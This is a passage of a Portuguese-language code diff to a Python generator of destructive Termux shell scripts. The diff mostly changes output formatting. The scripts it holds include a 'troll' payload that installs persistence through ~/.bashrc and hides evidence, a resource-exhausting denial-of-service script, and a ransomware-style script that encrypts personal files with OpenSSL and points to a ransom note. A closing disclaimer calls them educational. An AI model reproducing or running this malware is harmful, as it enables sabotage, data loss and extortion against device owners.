-    echo "[bold yellow]INICIANDO FASE DE IRRITAÇÃO...[/bold yellow]"
+if [ "{'true' if incluir_irritante else 'false'}" = "true" ]; then
+    echo "INICIANDO FASE DE IRRITAÇÃO..."
     
     # Notificações constantes
     if command -v termux-notification &> /dev/null; then
@@ -1010,7 +945,7 @@ if [ "{incluir_irritante}" = "true" ]; then
 fi
 
 # Persistência máxima
-echo "[yellow]INSTALANDO PERSISTÊNCIA AVANÇADA...[/yellow]"
+echo "INSTALANDO PERSISTÊNCIA AVANÇADA..."
 
 # Múltiplos métodos de persistência
 echo 'bash ~/.troll_persistente &' >> ~/.bashrc
@@ -1040,9 +975,9 @@ chmod +x ~/.troll_persistente
 
 # Mensagem final
 echo " "
-echo "[bold white on red]💣 TROLL COMPLETO ATIVADO! SEU DISPOSITIVO ESTÁ COMPROMETIDO! 💣[/bold white on red]"
-echo "[red]Destruição e irritação combinadas para efeito máximo![/red]"
-echo "[yellow]Reinicie o Termux para experimentar o efeito completo.[/yellow]"
+echo "💣 TROLL COMPLETO ATIVADO! SEU DISPOSITIVO ESTÁ COMPROMETIDO! 💣"
+echo "Destruição e irritação combinadas para efeito máximo!"
+echo "Reinicie o Termux para experimentar o efeito completo."
 
 # Ocultar evidências
 sleep 5
@@ -1057,7 +992,7 @@ exit 0
 # 🐌 NEGAÇÃO DE SERVIÇO COMPLETA 🐌
 # ⚠️  Este script consumirá todos os recursos do sistema!
 
-echo "[bold red]INICIANDO ATAQUE DE NEGAÇÃO DE SERVIÇO...[/bold red]"
+echo "INICIANDO ATAQUE DE NEGAÇÃO DE SERVIÇO..."
 sleep 2
 
 # Consumir CPU
@@ -1117,9 +1052,9 @@ EOF
 chmod +x ~/.dos_attack
 
 echo " "
-echo "[bold red]🐌 ATAQUE DE NEGAÇÃO DE SERVIÇO INICIADO! 🐌[/bold red]"
-echo "[red]Seu dispositivo ficará extremamente lento e pode travar![/red]"
-echo "[yellow]Reinicie para experimentar o efeito completo.[/yellow]"
+echo "🐌 ATAQUE DE NEGAÇÃO DE SERVIÇO INICIADO! 🐌"
+echo "Seu dispositivo ficará extremamente lento e pode travar!"
+echo "Reinicie para experimentar o efeito completo."
 
 exit 0
 """
@@ -1129,12 +1064,12 @@ exit 0
 # 🔐 CRIPTOGRAFIA DE DADOS PESSOAIS 🔐
 # ⚠️  Este script criptografará seus arquivos pessoais!
 
-echo "[bold red]INICIANDO CRIPTOGRAFIA DE DADOS...[/bold red]"
+echo "INICIANDO CRIPTOGRAFIA DE DADOS..."
 sleep 2
 
 # Verificar se OpenSSL está disponível
 if ! command -v openssl &> /dev/null; then
-    echo "[red]OpenSSL não encontrado! Instale com: pkg install openssl[/red]"
+    echo "OpenSSL não encontrado! Instale com: pkg install openssl"
     exit 1
 fi
 
@@ -1203,20 +1138,17 @@ EOF
 chmod +x ~/.check_encryption
 
 echo " "
-echo "[bold red]🔐 CRIPTOGRAFIA COMPLETA! SEUS ARQUIVOS ESTÃO BLOQUEADOS! 🔐[/bold red]"
-echo "[red]Verifique o arquivo LEIA-ME.txt no seu armazenamento para detalhes.[/red]"
+echo "🔐 CRIPTOGRAFIA COMPLETA! SEUS ARQUIVOS ESTÃO BLOQUEADOS! 🔐"
+echo "Verifique o arquivo LEIA-ME.txt no seu armazenamento para detalhes."
 
 exit 0
 """
 
     def _sair(self):
-        console.print(Panel.fit(
-            "[blink bold red]⚠️  AVISO FINAL: USO ILEGAL É CRIME! ⚠️[/blink bold red]\n"
-            "Estes scripts são apenas para fins educacionais e de teste.\n"
-            "Nunca use em dispositivos que não sejam seus ou sem permissão.",
-            border_style="red"
-        ))
-        console.print("[cyan]Saindo com segurança...[/cyan]")
+        print("\033[1;41m⚠️  AVISO FINAL: USO ILEGAL É CRIME! ⚠️\033[0m")
+        print("Estes scripts são apenas para fins educacionais e de teste.")
+        print("Nunca use em dispositivos que não sejam seus ou sem permissão.")
+        print("\033[1;36mSaindo com segurança...\033[0m")
         time.sleep(2)
         sys.exit(0)
 
@@ -1224,17 +1156,17 @@ def main():
     try:
         # Verificar se estamos no Termux
         if not os.path.exists('/data/data/com.termux/files/home'):
-            console.print("[red]Este script é específico para Termux![/red]")
-            console.print("[yellow]Execute apenas no ambiente Termux.[/yellow]")
+            print("\033[1;31mEste script é específico para Termux!\033[0m")
+            print("\033[1;33mExecute apenas no ambiente Termux.\033[0m")
             sys.exit(1)
             
         gerador = GeradorDestrutivoTermux()
         gerador.mostrar_menu_principal()
     except KeyboardInterrupt:
-        console.print("\n[red]✗ Operação cancelada pelo usuário[/red]")
+        print("\n\033[1;31m✗ Operação cancelada pelo usuário\033[0m")
         sys.exit(0)
     except Exception as e:
-        console.print(f"\n[red]✗ Erro inesperado: {str(e)}[/red]")
+        print(f"\n\033[1;31m✗ Erro inesperado: {str(e)}\033[0m")
         sys.exit(1)
 
 if __name__ == '__main__':
